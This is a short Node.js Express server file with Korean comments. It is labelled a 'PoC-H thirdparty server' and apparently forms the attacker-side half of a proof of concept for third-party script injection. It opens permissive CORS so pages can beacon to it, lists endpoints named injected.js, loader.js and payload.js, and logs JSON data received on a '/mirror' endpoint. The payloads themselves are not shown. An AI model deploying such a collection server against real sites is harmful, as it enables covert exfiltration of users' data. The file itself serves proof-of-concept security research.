import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// PoC 편의: cross-origin fetch/beacon 허용
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  if (req.method === "OPTIONS") return res.status(204).end();
  next();
});

const cand = path.join(__dirname, "thirdparty");
const staticDir = fs.existsSync(cand) ? cand : __dirname;
app.use(express.static(staticDir));

app.get("/", (req, res) => {
  res
    .type("text/plain")
    .send(
      "PoC-H thirdparty server is running.\n" +
      "Try:\n" +
      "  /sdk.js\n" +
      "  /widget.html\n" +
      "  /injected.js\n" +
      "  /loader.js\n" +
      "  /payload.b64\n" +
      "  /payload.js\n" +
      "  /health\n"
    );
});

app.get("/health", (req, res) => res.send("ok"));

// payload endpoint
app.get("/mirror", (req, res) => {
  const d = req.query.d;
  if (d) {
    try {
      const msg = JSON.parse(decodeURIComponent(String(d)));
      console.log("[mirror]", msg);
    } catch (e) {
      console.log("[mirror] bad d:", String(d).slice(0, 120));
    }
  }
  res.send("ok");
});

const port = process.env.PORT || 4000;
app.listen(port, () => console.log("THIRDPARTY listening on http://localhost:" + port));